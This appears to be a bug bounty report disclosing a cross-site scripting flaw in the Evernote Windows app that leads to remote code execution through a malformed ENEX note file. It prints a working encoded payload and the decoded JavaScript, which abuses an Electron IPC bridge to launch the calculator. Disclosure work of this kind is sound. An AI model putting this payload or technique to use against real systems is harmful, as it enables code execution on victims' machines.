## Vulnerability Details

## Summary:
Loading a malformed note file in the Evernote(Windows) application will cause XSS in the application, leading to an RCE

## Steps To Reproduce:

### STEP[Creation of malormed note file]
  1. Install Evernote's Web Clip extension(https://evernote.com/intl/jp/features/webclipper) in my browser and execute "Clip Full Page" on any website.  
info: I installed this on Google Chrome.
  2. Open the installed Evernote application and open the note of the clipped web page.
  3. Export note in ENEX format.  
  {F2623333}
  4. In the exported ENEX file, insert the HTML-entityized XSS payload in the "--en-clipped-source-title" section. And save the file.  
info: In XPath, it is the style attribute "--en-clipped-source-title" of the div element in the CDATA that can be obtained by "/en-export/note/content/text()".

I have inserted this payload.
```
&quot;&gt;&lt;img src onerror=eval(atob(&apos;c2V0VGltZW91dCgoKT0+e3dpbmRvdy5lbGVjdHJvbkFwaS5pcGNSZW5kZXJlci5zZW5kKCJCcm9rZXJCcmlkZ2UiLHthY3Rpb246IkJyaWRnZS9QdWJsaXNoIix0b3BpY3M6ImJvcm9uLmFjdGlvbnMub3BlbkJyb3dzZXJXaW5kb3ciLHR5cGU6IiIsZGF0YTp7InJlcXVpcmVzQXV0aGVudGljYXRpb24iOmZhbHNlLCJ1cmwiOiJmaWxlOi8vL0M6L1dpbmRvd3MvU3lzdGVtMzIvY2FsYy5leGUifX0pO30sNTAwMCk7&apos;))&gt;
```

### STEP[Load malformed note file cause XSS and RCE]
  1. Open the installed Evernote application and import the malformed note file.
  2. A few seconds after the import is complete, the Windows calculator application will launch.
  {F2623357}

NOTE:
Evernote versions is 
10.60.4-win-winstore-public (20230803182206)
This is the latest version available for installation from the Microsoft Store as of August 22, 2023 (JST).


## How It works:
The following code is executed in the XSS that occurs when the note file import completes.
```
setTimeout(()=>{window.electronApi.ipcRenderer.send("BrokerBridge",{action:"Bridge/Publish",topics:"boron.actions.openBrowserWindow",type:"",data:{"requiresAuthentication":false,"url":"file:///C:/Windows/System32/calc.exe"}});},5000);
```
In this code, the following steps are taken:
1. Wait 5 seconds
2. Using the "window.electronApi.ipcRenderer.send" prepared in Preload, the "BrokerBridge" function is called in the main process via IPC communication.
3. "boron.actions.openBrowserWindow" function could be used to run local applications.

## Impact

Loading an malformed note file in an application can result in command execution, program execution, or access to an external URL.
